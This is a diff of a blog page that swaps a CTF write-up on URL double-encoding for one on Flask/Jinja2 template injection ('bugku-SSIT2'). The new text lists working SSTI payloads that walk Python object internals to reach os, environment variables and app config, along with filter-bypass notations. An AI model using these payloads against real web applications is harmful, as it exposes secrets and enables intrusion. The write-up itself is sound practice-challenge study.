@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php,url编,phps," />
+  <meta name="keywords" content="SSIT漏洞," />
 
 
 
@@ -79,24 +79,23 @@
 
 
 
-<meta name="description" content="访问index.phps（储存源代码的)  看源码， 参数id 编码&#x3D;admin 需要两次url编码，因为浏览器会字典解码一次 用burp编码  访问">
+<meta name="description" content="提示要传带flag 没有任何过滤啥的了 直接读取就行 网上可以找到SSIT的payload 借鉴一篇文章： flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__  返回类型所属的对象 __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases_">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界php2">
-<meta property="og:url" content="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/index.html">
+<meta property="og:title" content="bugku-SSIT2">
+<meta property="og:url" content="http://example.com/2022/03/10/bugku-SSIT2/index.html">
 <meta property="og:site_name" content="web地板成长之路">
-<meta property="og:description" content="访问index.phps（储存源代码的)  看源码， 参数id 编码&#x3D;admin 需要两次url编码，因为浏览器会字典解码一次 用burp编码  访问">
+<meta property="og:description" content="提示要传带flag 没有任何过滤啥的了 直接读取就行 网上可以找到SSIT的payload 借鉴一篇文章： flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__  返回类型所属的对象 __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases_">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/a.png">
-<meta property="og:image" content="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/b.png">
-<meta property="og:image" content="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/c.png">
-<meta property="article:published_time" content="2021-12-27T06:51:08.000Z">
-<meta property="article:modified_time" content="2021-12-27T07:02:41.441Z">
+<meta property="og:image" content="http://example.com/2022/03/10/bugku-SSIT2/ugkuda4w4512.png">
+<meta property="og:image" content="http://example.com/2022/03/10/bugku-SSIT2/2bugsadw01226.png">
+<meta property="og:image" content="http://example.com/2022/03/10/bugku-SSIT2/bug3jeaea5.png">
+<meta property="og:image" content="http://example.com/2022/03/10/bugku-SSIT2/catwaf601403.png">
+<meta property="article:published_time" content="2022-03-10T12:06:49.000Z">
+<meta property="article:modified_time" content="2022-03-10T12:19:20.450Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="php">
-<meta property="article:tag" content="url编">
-<meta property="article:tag" content="phps">
+<meta property="article:tag" content="SSIT漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/a.png">
+<meta name="twitter:image" content="http://example.com/2022/03/10/bugku-SSIT2/ugkuda4w4512.png">
 
 
 
@@ -126,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/12/27/攻防世界php2/"/>
+  <link rel="canonical" href="http://example.com/2022/03/10/bugku-SSIT2/"/>
 
 
 
 
 
-  <title>攻防世界php2 | web地板成长之路</title>
+  <title>bugku-SSIT2 | web地板成长之路</title>
   
 
 
@@ -269,7 +268,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/bugku-SSIT2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -286,7 +285,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界php2</h1>
+          <h1 class="post-title" itemprop="name headline">bugku-SSIT2</h1>
         
 
         <div class="post-meta">
@@ -298,8 +297,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-27T14:51:08+08:00">
-                2021-12-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-10T20:06:49+08:00">
+                2022-03-10
               </time>
             
 
@@ -358,15 +357,43 @@
       
 
       
-        <p>访问index.phps（储存源代码的)</p>
-<p><img src="/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/a.png" alt="a"></p>
-<p>看源码，</p>
-<p>参数id 编码=admin</p>
-<p>需要两次url编码，因为浏览器会字典解码一次</p>
-<p>用burp编码</p>
-<p><img src="/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/b.png" alt="b"></p>
-<p>访问</p>
-<p><img src="/2021/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cphp2/c.png" alt="c"></p>
+        <p><img src="/2022/03/10/bugku-SSIT2/ugkuda4w4512.png" alt="ugkuda4w4512"></p>
+<p>提示要传带flag</p>
+<p>没有任何过滤啥的了</p>
+<p>直接读取就行</p>
+<p>网上可以找到SSIT的payload</p>
+<p>借鉴一篇文章：</p>
+<p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
+<p><code>__dict__ 保存类实例或对象实例的属性变量键值对字典 __class__  返回类型所属的对象 __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases__   返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的  __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__  类的初始化方法 __globals__  对包含函数全局变量的字典的引用 </code></p>
+<h3 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a>一些姿势</h3><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)</a></p>
+<h4 id="1、config"><a href="#1、config" class="headerlink" title="1、config"></a>1、config</h4><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
+<h4 id="2、self"><a href="#2、self" class="headerlink" title="2、self"></a>2、self</h4><p><code>&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config </code></p>
+<h4 id="3、-quot-quot-、-、-等数据结构"><a href="#3、-quot-quot-、-、-等数据结构" class="headerlink" title="3、&quot;&quot;、[]、()等数据结构"></a>3、<code>&quot;&quot;</code>、<code>[]</code>、<code>()</code>等数据结构</h4><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p>
+<h4 id="4、url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等"><a href="#4、url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等" class="headerlink" title="4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等"></a>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
+<p>例如：</p>
+<p><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125; &#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125; &#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125; </code></p>
+<h3 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h3><p><a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2模板注入过滤器绕过</a><br> <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a736e39c3510">SSTI Flask 技巧进阶</a></p>
+<p>以下表示法可用于访问对象的属性：</p>
+<ul>
+<li><code>request.__class__</code></li>
+<li><code>request[&quot;__class__&quot;]</code></li>
+<li><code>request|attr(&quot;__class__&quot;)</code></li>
+</ul>
+<p>可以使用以下方法访问数组元素：</p>
+<ul>
+<li><code>array[0]</code></li>
+<li><code>array.pop(0)</code></li>
+<li><code>array.__getitem__(2)</code></li>
+</ul>
+<p>然后再看本题</p>
+<p>ls一下文件看看</p>
+<p><img src="/2022/03/10/bugku-SSIT2/2bugsadw01226.png" alt="2bugsadw01226"></p>
+<p>可以发现一些文件</p>
+<p><img src="/2022/03/10/bugku-SSIT2/bug3jeaea5.png" alt="bug3jeaea5"></p>
+<p>从第一个开始查看</p>
+<p>很好，第一个app就发现flag</p>
+<p><img src="/2022/03/10/bugku-SSIT2/catwaf601403.png" alt="catwaf601403"></p>
+<p>然后直接cat打开就ok</p>
 
       
     </div>
@@ -384,11 +411,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php/" rel="tag"># php</a>
-          
-            <a href="/tags/url%E7%BC%96/" rel="tag"># url编</a>
-          
-            <a href="/tags/phps/" rel="tag"># phps</a>
+            <a href="/tags/SSIT%E6%BC%8F%E6%B4%9E/" rel="tag"># SSIT漏洞</a>
           
         </div>
       
@@ -401,8 +424,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/12/26/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="序列化和反序列化">
-                <i class="fa fa-chevron-left"></i> 序列化和反序列化
+              <a href="/2022/03/09/ctfshow-web128/" rel="next" title="ctfshow-web128-130">
+                <i class="fa fa-chevron-left"></i> ctfshow-web128-130
               </a>
             
           </div>
@@ -410,10 +433,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/12/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%A2%98%EF%BC%88%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89/" rel="prev" title="实验室考核题（序列化和反序列化）">
-                实验室考核题（序列化和反序列化） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -465,8 +484,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -526,6 +554,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.</span> <span class="nav-text">一些姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81config"><span class="nav-number">1.1.</span> <span class="nav-text">1、config</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81self"><span class="nav-number">1.2.</span> <span class="nav-text">2、self</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81-quot-quot-%E3%80%81-%E3%80%81-%E7%AD%89%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">1.3.</span> <span class="nav-text">3、&quot;&quot;、[]、()等数据结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config%E7%AD%89"><span class="nav-number">1.4.</span> <span class="nav-text">4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">常用绕过</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
